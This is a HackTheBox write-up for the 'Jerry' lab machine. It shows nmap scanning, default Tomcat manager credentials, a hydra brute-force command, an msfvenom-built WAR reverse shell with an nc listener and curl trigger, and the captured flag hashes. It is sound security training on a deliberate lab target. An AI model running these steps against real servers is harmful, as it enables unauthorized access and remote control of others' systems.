# Jerry — HackTheBox

> **Difficulty:** Easy · **OS:** Windows · **Date:** Oct 14, 2026  
> **Author:** [@ph4n3s](https://github.com/phanesopenyoureyes)

---

## Table of contents
1. [Recon](#1-recon)
2. [Enumeration](#2-enumeration)
3. [Exploitation](#3-exploitation)
4. [Post-exploitation](#4-post-exploitation)

---

## 1. Recon

We check that the machine is up:

```bash
ping -c 4 10.129.75.155
```

---

## 2. Enumeration

### 2.1 Port scan

```bash
nmap -p- --min-rate 5000 -T4 10.129.75.155 > ~/HTB_machines/Jerry/allports
```

> **Note:** Although on HTB we could use `-A --script vuln` directly, in a real environment it would be too aggressive. Doing it in stages is better practice.

**Result:** port `8080` open as an HTTP proxy.

```bash
nmap -p 8080 -sC -sV 10.129.75.155 -oN ~/HTB_machines/Jerry/targeted
```

**Result:** Apache Tomcat 7.0.88 with Coyote JSP engine 1.1. An old version with a default configuration.

---

### 2.2 Vector identification

We browse to `http://10.129.75.155:8080/`. When we click **Manager App**, the **401 Unauthorized** error page exposes the example credentials:

| Field | Value |
|-------|-------|
| User | `tomcat` |
| Password | `s3cret` |

> **Critical misconfiguration:** Tomcat's default installation shows credentials on the error page.

In a real environment we would use brute force:

```bash
hydra -l tomcat -P /usr/share/wordlists/rockyou.txt 10.129.75.155 -s 8080 http-get /manager/html
```

Once inside the manager we identify two vectors:
- A panel with deployed applications and active subdomains.
- An option to **upload WAR files** → lets us deploy arbitrary Java code.

---

## 3. Exploitation

A **WAR (Web Application Archive)** file is a ZIP package containing a Java web application. Tomcat is designed to receive and deploy them — we put a reverse shell inside one.

> **What is a reverse shell?**  
> Instead of connecting to the victim, it is the victim that connects to us. This gets around firewalls that block incoming connections.

### Step 1 — Generate the malicious WAR

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.39 LPORT=4444 -f war -o shell.war
```

| Flag | Description |
|------|-------------|
| `-p java/jsp_shell_reverse_tcp` | Java payload compatible with Tomcat |
| `LHOST` | Our HTB VPN IP (`tun0`), **not** the local IP |
| `LPORT` | The port we will listen on |
| `-f war` | WAR format |
| `-o shell.war` | Output file |

### Step 2 — Start listening

```bash
nc -lvnp 4444
```

### Step 3 — Upload the WAR

`http://10.129.75.155:8080/manager/html` → **WAR file to deploy** section → select `shell.war` → **Deploy**. Tomcat deploys the app and it shows up as `/shell`.

### Step 4 — Trigger the shell

```bash
curl http://10.129.75.155:8080/shell/
```

> The `curl` is the trigger. The payload connects back to our `nc` and the curl will hang while the shell is active — expected behavior. It also works from the browser.

---

## 4. Post-exploitation

Jerry is a **Windows** machine. The commands change:

| Linux | Windows |
|-------|---------|
| `ls` | `dir` |
| `cat file` | `type file` |
| `pwd` | `cd` |

We check privileges:


> Tomcat on Windows usually runs with elevated privileges. On this machine **no privilege escalation is needed**.

We navigate to the flags:


> Jerry has a quirk: both flags live in a single file.

### Flags

| | Hash |
|-|------|
| User | `7004dbcef0f854e0fb401875f26ebd00` |
| Administrator | `04a8b36e1545a455393d067e772fe90e` |

---

*Write-up by [ph4n3s](https://github.com/phanesopenyoureyes) — I will keep improving it as I learn more.*
